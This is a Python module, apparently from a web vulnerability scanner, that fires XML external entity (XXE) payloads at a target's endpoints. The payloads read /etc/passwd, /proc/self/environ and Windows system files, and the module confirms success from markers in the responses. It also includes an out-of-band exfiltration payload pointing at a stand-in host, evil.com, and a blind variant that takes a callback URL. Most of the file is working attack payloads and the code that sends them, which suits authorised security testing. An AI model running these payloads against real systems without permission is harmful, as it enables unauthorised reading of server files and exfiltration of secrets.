import re
from urllib.parse import urlparse, parse_qs, urlencode

from core.config import Config
from core.utils import (
    print_info, print_good, print_warning, print_error, print_vuln,
    print_phase, get_session, normalize_url,
)
from lib.payloads import Payloads
import logging


class XXEModule:
    def __init__(self, scanner):
        self.scanner = scanner
        self.config = scanner.config
        self.payloads = Payloads()

    def _build_xxe_payload(self, entity_name, file_path, exfil_type="file"):
        if exfil_type == "file":
            return (
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                '<!DOCTYPE data [\n'
                f'  <!ENTITY {entity_name} SYSTEM "file://{file_path}">\n'
                ']>\n'
                f'<root>&{entity_name};</root>'
            )
        elif exfil_type == "error":
            return (
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                '<!DOCTYPE data [\n'
                f'  <!ENTITY % file SYSTEM "file://{file_path}">\n'
                '  <!ENTITY % dtd SYSTEM "http://evil.com/xxe.dtd">\n'
                '  %dtd; %send;\n'
                ']>\n'
                '<root>test</root>'
            )
        return ""

    def _build_blind_xxe(self, callback_url):
        return (
            '<?xml version="1.0" encoding="UTF-8"?>\n'
            '<!DOCTYPE data [\n'
            f'  <!ENTITY % file SYSTEM "file:///etc/passwd">\n'
            f'  <!ENTITY % dtd SYSTEM "{callback_url}/xxe.dtd">\n'
            '  %dtd; %send;\n'
            ']>\n'
            '<root>test</root>'
        )

    def test_xxe(self, target, session, found_endpoints=None):
        findings = []
        endpoints = found_endpoints or [target]
        content_types = self.payloads.XXE_CONTENT_TYPES
        field_names = self.payloads.XXE_FIELD_NAMES

        linux_files = ["/etc/passwd", "/etc/hostname", "/proc/self/environ"]
        windows_files = ["C:\\windows\\win.ini", "C:\\windows\\system32\\drivers\\etc\\hosts"]

        for endpoint in endpoints:
            url = endpoint if endpoint.startswith("http") else f"{normalize_url(target)}{endpoint}"

            for content_type in content_types:
                for file_path in linux_files + windows_files:
                    payload = self._build_xxe_payload("xxe_data", file_path)

                    try:
                        resp = session.post(
                            url,
                            data=payload,
                            headers={"Content-Type": content_type},
                            timeout=self.config.timeout,
                            verify=self.config.verify_tls,
                        )
                        body = resp.text or ""

                        indicators = {
                            "/etc/passwd": ["root:x:0:0", "root:", "/bin/bash", "/bin/sh"],
                            "/etc/hostname": [],
                            "/proc/self/environ": ["PATH=", "HOME=", "USER="],
                            "win.ini": ["[", "for 16-bit app support"],
                            "hosts": ["localhost", "127.0.0.1"],
                        }

                        for fpath, marks in indicators.items():
                            if fpath in file_path:
                                for mark in marks:
                                    if mark.lower() in body.lower():
                                        finding = {
                                            "type": "xxe",
                                            "severity": "critical",
                                            "url": url,
                                            "content_type": content_type,
                                            "file_read": file_path,
                                            "evidence": mark[:80],
                                            "response_code": resp.status_code,
                                        }
                                        findings.append(finding)
                                        print_vuln(
                                            f"XXE confirmed at {url}: "
                                            f"read {file_path} (evidence: {mark[:40]})"
                                        )
                                        break
                                break

                    except Exception:
                        logging.exception("xxe.py: exception")
                        continue
            for content_type in content_types:
                for field in field_names:
                    payload = (
                        '<?xml version="1.0" encoding="UTF-8"?>\n'
                        '<!DOCTYPE data [\n'
                        '  <!ENTITY xxe SYSTEM "file:///etc/passwd">\n'
                        ']>\n'
                        f'<root><{field}>&xxe;</{field}></root>'
                    )

                    try:
                        resp = session.post(
                            url,
                            data=payload,
                            headers={"Content-Type": content_type},
                            timeout=self.config.timeout,
                            verify=self.config.verify_tls,
                        )
                        body = resp.text or ""

                        if any(marker in body for marker in ["root:x:0:0", "root:", "/bin/bash"]):
                            finding = {
                                "type": "xxe_parameter",
                                "severity": "critical",
                                "url": url,
                                "field": field,
                                "content_type": content_type,
                                "evidence": "etc/passwd content in response",
                            }
                            findings.append(finding)
                            print_vuln(
                                f"XXE via field '{field}' at {url}: "
                                f"/etc/passwd content reflected"
                            )
                    except Exception:
                        logging.exception("xxe.py: exception")
                        continue
            json_payloads = [
                '{"data": "&xxe;"}',
                '{"xml": "<?xml version=\\"1.0\\"?><!DOCTYPE data [<!ENTITY xxe SYSTEM \\"file:///etc/passwd\\">]><root>&xxe;</root>"}',
            ]

            for jp in json_payloads:
                try:
                    resp = session.post(
                        url,
                        data=jp,
                        headers={"Content-Type": "application/json"},
                        timeout=self.config.timeout,
                        verify=self.config.verify_tls,
                    )
                    body = resp.text or ""
                    if any(marker in body for marker in ["root:x:0:0", "root:", "/bin/bash"]):
                        finding = {
                            "type": "xxe_json",
                            "severity": "critical",
                            "url": url,
                            "payload_type": "json_xml_injection",
                            "evidence": "etc/passwd content in JSON response",
                        }
                        findings.append(finding)
                        print_vuln(f"XXE via JSON XML injection at {url}")
                except Exception:
                    logging.exception("xxe.py: exception")
                    continue
        return findings

    def run(self, target, session=None):
        print_phase("XXE Testing")
        self.config.target_url = normalize_url(target)

        if session is None:
            session = get_session()
        if session is None:
            print_error("Cannot proceed without a valid HTTP session.")
            return

        all_findings = []
        endpoints = [target]

        scan_data_endpoints = self.config.scan_data.get("api", {}).get("endpoints", [])
        if scan_data_endpoints:
            endpoints.extend(scan_data_endpoints)

        parsed = urlparse(target)
        common_xml_endpoints = [
            f"{parsed.scheme}://{parsed.netloc}/api/xml",
            f"{parsed.scheme}://{parsed.netloc}/api/import",
            f"{parsed.scheme}://{parsed.netloc}/api/upload",
            f"{parsed.scheme}://{parsed.netloc}/api/feed",
            f"{parsed.scheme}://{parsed.netloc}/api/soap",
            f"{parsed.scheme}://{parsed.netloc}/soap",
            f"{parsed.scheme}://{parsed.netloc}/ws",
            f"{parsed.scheme}://{parsed.netloc}/wsdl",
            f"{parsed.scheme}://{parsed.netloc}/api/rss",
        ]
        endpoints.extend([e for e in common_xml_endpoints if e not in endpoints])

        print_info(f"Testing {len(endpoints)} endpoints for XXE vulnerabilities...")
        findings = self.test_xxe(target, session, endpoints)
        all_findings.extend(findings)

        self.config.scan_data["vulnerabilities"]["xxe"] = all_findings
        for f in all_findings:
            if f not in self.config.findings:
                self.config.findings.append(f)

        if all_findings:
            print_good(f"XXE testing complete: {len(all_findings)} potential issue(s) found.")
        else:
            print_info("XXE testing complete: no vulnerabilities found.")
